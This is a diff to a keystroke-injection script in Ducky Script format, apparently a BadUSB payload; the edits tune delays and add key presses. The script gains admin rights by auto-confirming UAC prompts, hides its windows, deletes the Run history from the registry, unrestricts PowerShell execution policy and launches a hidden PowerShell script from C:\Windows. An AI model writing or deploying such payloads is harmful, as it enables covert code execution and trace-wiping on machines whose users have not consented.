@@ -1,11 +1,12 @@
-DELAY 150
+DELAY 500
 GUI r 
 DELAY 150
 STRING powershell Start-Process notepad -Verb runAs
 ENTER
-DELAY 500
+DELAY 700
 ALT y
 DELAY 200
+ENTER
 ALT SPACE 
 DELAY 20
 STRING m 
@@ -30,9 +31,10 @@ GUI r
 DELAY 150  
 STRING powershell Start-Process cmd -Verb runAs 
 ENTER
-DELAY 500
+DELAY 700
 ALT y
 DELAY 200  
+ENTER
 STRING mode con:cols=15 lines=1 
 ENTER
 ALT SPACE 
@@ -45,12 +47,13 @@ ENTER
 REM Clear the Run history and exit
 STRING powershell "Remove-ItemProperty -Path 'HKCU:\Software\Microsoft\Windows\CurrentVersion\Explorer\RunMRU' -Name '*' -ErrorAction SilentlyContinue"
 ENTER
+DELAY 100
 STRING powershell Set-ExecutionPolicy 'Unrestricted' -Scope CurrentUser -Confirm:$false
 ENTER
 DELAY 100
 STRING powershell.exe -windowstyle hidden -File C:\Windows\config-1337.ps1
 ENTER
-DELAY 700
+DELAY 1500
 TAB
 DELAY 20
 TAB
@@ -74,7 +77,7 @@ DELAY 20
 TAB
 DELAY 20
 SPACE
-DELAY 200
+DELAY 500
 SPACE
 DELAY 50
 SPACE
@@ -83,7 +86,7 @@ GUI r
 DELAY 100
 STRING "C:\Program Files (x86)\DOSBox-0.74-3\DOSBox.exe"
 ENTER
-DELAY 700
+DELAY 1700
 STRING MOUNT C C:\ProgramData\
 ENTER
 STRING C:
